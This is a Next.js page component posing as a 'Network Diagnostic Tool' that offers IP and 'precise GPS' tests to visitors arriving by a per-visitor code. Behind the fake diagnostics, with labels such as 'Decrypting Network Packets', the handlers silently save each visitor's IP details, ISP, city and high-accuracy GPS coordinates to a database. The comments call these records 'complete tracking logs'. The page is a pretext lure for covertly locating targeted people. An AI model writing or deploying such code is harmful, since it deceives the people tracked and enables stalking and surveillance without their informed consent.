"use client";

import { useState, use } from "react";
import axios from "axios";

interface PageProps {
  params: Promise<{ visitorCode: string }>;
}

interface IpDetails {
  ipAddress: string;
  city: string;
  region: string;
  country: string;
  isp: string;
  latitude: number;
  longitude: number;
  userAgent: string;
}

interface GpsDetails {
  latitude: number;
  longitude: number;
  accuracy: number;
}

export default function DiagnosticPage({ params }: PageProps) {
  // Next.js 15 dynamic route parameter unwrap
  const { visitorCode } = use(params);

  // UI States
  const [loadingType, setLoadingType] = useState<"ip" | "gps" | null>(null);
  const [activeView, setActiveView] = useState<"none" | "ip" | "gps">("none");
  const [error, setError] = useState<string | null>(null);

  // Data States
  const [ipData, setIpData] = useState<IpDetails | null>(null);
  const [gpsData, setGpsData] = useState<GpsDetails | null>(null);

  // 1. IP Scan Handler
  const handleIpScan = async () => {
    setLoadingType("ip");
    setError(null);
    try {
      // Step A: Fetch user IP metadata
      const res = await axios.get("/api/location/ip");
      const data: IpDetails = res.data;

      // Step B: Save it to database silently with source: "IP"
      // FIXED: Spread data first, then override specific fields
      const payload = {
        ...data,
        visitorCode,
        source: "IP",
        accuracy: null,
      };
      await axios.post("/api/location/save", payload);

      // Step C: Show details to user on screen
      setIpData(data);
      setActiveView("ip");
    } catch (err) {
      console.error(err);
      setError("Failed to resolve network IP routing details.");
    } finally {
      setLoadingType(null);
    }
  };

  // 2. GPS Scan Handler
  const handleGpsScan = async () => {
    if (!navigator.geolocation) {
      setError("Your browser does not support GPS Geolocation.");
      return;
    }

    setLoadingType("gps");
    setError(null);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        try {
          const { latitude, longitude, accuracy } = position.coords;

          // Step A: Silently get IP info as well for complete tracking logs
          let extraIpInfo = {};
          try {
            const ipRes = await axios.get("/api/location/ip");
            extraIpInfo = ipRes.data;
          } catch (ipErr) {
            console.warn("Could not append IP metadata to GPS log", ipErr);
          }

          // Step B: Save full high-accuracy data in DB
          // FIXED: Spread extraIpInfo first so precise GPS coordinates overwrite rough IP coordinates
          const payload = {
            ...extraIpInfo,
            visitorCode,
            source: "GPS",
            latitude,
            longitude,
            accuracy,
          };
          await axios.post("/api/location/save", payload);

          // Step C: Show details to user on screen
          setGpsData({ latitude, longitude, accuracy });
          setIpData(extraIpInfo as IpDetails); // Show IP info alongside if fetched
          setActiveView("gps");
        } catch (err) {
          console.error(err);
          setError("Database sync failed, but location was accessed.");
        } finally {
          setLoadingType(null);
        }
      },
      (geoError) => {
        console.error(geoError);
        setLoadingType(null);
        if (geoError.code === 1) {
          setError("GPS Permission Denied. Please enable location to run this test.");
        } else {
          setError("Unable to retrieve precise GPS coordinates.");
        }
      },
      { enableHighAccuracy: true, timeout: 15000 }
    );
  };

  return (
    <main className="min-h-screen bg-[#0a0a0f] text-slate-100 flex flex-col items-center justify-center p-4 font-sans relative overflow-hidden">
      {/* Cool techy background glow */}
      <div className="pointer-events-none absolute inset-0 overflow-hidden z-0">
        <div className="absolute -top-[30%] -right-[10%] h-[800px] w-[800px] rounded-full bg-indigo-900/10 blur-[120px]" />
        <div className="absolute -bottom-[20%] -left-[10%] h-[600px] w-[600px] rounded-full bg-cyan-900/5 blur-[120px]" />
      </div>

      <div className="relative z-10 w-full max-w-lg rounded-2xl border border-white/[0.05] bg-white/[0.02] backdrop-blur-xl p-6 lg:p-8 shadow-2xl">

        {/* Header */}
        <div className="text-center mb-8 border-b border-white/[0.05] pb-6">
          <div className="inline-flex h-12 w-12 items-center justify-center rounded-xl bg-indigo-500/10 border border-indigo-500/30 text-indigo-400 font-mono mb-3 text-lg font-bold animate-pulse">
            {"[📡]"}
          </div>
          <h1 className="text-2xl font-black uppercase tracking-wider text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 via-purple-400 to-cyan-400">
            Network Diagnostic Tool
          </h1>
          <p className="text-xs text-slate-400 uppercase tracking-widest mt-1">
            Secure Nodes Verification & Link Routing
          </p>
        </div>

        {/* Dynamic Warning / Error State */}
        {error && (
          <div className="mb-6 rounded-xl border border-red-500/20 bg-red-500/10 px-4 py-3 text-sm text-red-400 text-center font-medium animate-shake">
            ⚠️ {error}
          </div>
        )}

        {/* --- Phase 1: Action Selection Buttons --- */}
        {activeView === "none" && !loadingType && (
          <div className="space-y-4">
            <p className="text-slate-400 text-sm text-center mb-6 leading-relaxed">
              Verify your connection parameters. Select one of the diagnostics below to analyze and verify your connection integrity.
            </p>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {/* Button 1: IP Scan */}
              <button
                onClick={handleIpScan}
                className="group relative flex flex-col items-center justify-center p-6 rounded-xl border border-white/5 bg-white/[0.01] hover:border-indigo-500/30 hover:bg-indigo-500/[0.03] active:scale-95 transition-all duration-300"
              >
                <span className="text-2xl mb-2 group-hover:animate-bounce">🌐</span>
                <span className="font-bold text-sm text-slate-200 group-hover:text-indigo-400">Scan IP Routing</span>
                <span className="text-[10px] text-slate-500 mt-1 uppercase tracking-wider">Fast Network Test</span>
              </button>

              {/* Button 2: GPS Scan */}
              <button
                onClick={handleGpsScan}
                className="group relative flex flex-col items-center justify-center p-6 rounded-xl border border-white/5 bg-white/[0.01] hover:border-cyan-500/30 hover:bg-cyan-500/[0.03] active:scale-95 transition-all duration-300"
              >
                <span className="text-2xl mb-2 group-hover:animate-bounce">🛰️</span>
                <span className="font-bold text-sm text-slate-200 group-hover:text-cyan-400">Verify Precise GPS</span>
                <span className="text-[10px] text-slate-500 mt-1 uppercase tracking-wider">High Accuracy Test</span>
              </button>
            </div>
          </div>
        )}

        {/* --- Phase 2: Beautiful Loading Screens --- */}
        {loadingType && (
          <div className="flex flex-col items-center justify-center py-10 space-y-4">
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-indigo-500 border-t-transparent shadow-[0_0_15px_rgba(99,102,241,0.4)]" />
            <p className="text-sm font-mono tracking-widest text-indigo-400 animate-pulse uppercase text-center">
              {loadingType === "ip"
                ? "Decrypting Network Packets..."
                : "Establishing Orbital Satellite Link..."}
            </p>
          </div>
        )}

        {/* --- Phase 3: Display IP details --- */}
        {activeView === "ip" && ipData && (
          <div className="space-y-6 animate-fade-in">
            <div className="bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-xl p-4 text-center text-sm font-semibold">
              ✓ Network diagnostics completed successfully.
            </div>

            <div className="rounded-xl border border-white/[0.05] bg-white/[0.01] p-5 space-y-3 font-mono text-xs">
              <DetailRow label="Public IP Address" value={ipData.ipAddress} highlight />
              <DetailRow label="Service Provider (ISP)" value={ipData.isp} />
              <DetailRow label="Estimated City" value={ipData.city} />
              <DetailRow label="Region State" value={ipData.region} />
              <DetailRow label="Country Code" value={ipData.country} />
            </div>

            <button
              onClick={() => setActiveView("none")}
              className="w-full py-3 rounded-xl bg-white/5 border border-white/10 text-xs uppercase font-bold tracking-widest hover:bg-white/10 transition-all text-slate-400 hover:text-white"
            >
              Back to Diagnostic Menu
            </button>
          </div>
        )}

        {/* --- Phase 4: Display GPS details --- */}
        {activeView === "gps" && gpsData && (
          <div className="space-y-6 animate-fade-in">
            <div className="bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-xl p-4 text-center text-sm font-semibold">
              ✓ Satellite Lock established with high-precision.
            </div>

            <div className="rounded-xl border border-white/[0.05] bg-white/[0.01] p-5 space-y-3 font-mono text-xs">
              <DetailRow label="Latitude" value={gpsData.latitude.toFixed(6)} highlight />
              <DetailRow label="Longitude" value={gpsData.longitude.toFixed(6)} highlight />
              <DetailRow label="GPS Accuracy" value={`${gpsData.accuracy.toFixed(1)} meters`} />
              {ipData && (
                <>
                  <div className="border-t border-white/[0.05] my-2 pt-2" />
                  <DetailRow label="Resolved City" value={ipData.city} />
                  <DetailRow label="Carrier Node (ISP)" value={ipData.isp} />
                </>
              )}
            </div>

            <button
              onClick={() => setActiveView("none")}
              className="w-full py-3 rounded-xl bg-white/5 border border-white/10 text-xs uppercase font-bold tracking-widest hover:bg-white/10 transition-all text-slate-400 hover:text-white"
            >
              Back to Diagnostic Menu
            </button>
          </div>
        )}

      </div>
    </main>
  );
}

// ─── Reusable Table Row Component ───────────────────────────────────────────
function DetailRow({ label, value, highlight }: { label: string; value: string; highlight?: boolean }) {
  return (
    <div className="flex justify-between items-center py-1.5 border-b border-white/[0.02] last:border-0">
      <span className="text-slate-500 text-[10px] uppercase tracking-wider">{label}</span>
      <span className={`text-right ${highlight ? "text-indigo-400 font-bold" : "text-slate-300"}`}>
        {value}
      </span>
    </div>
  );
}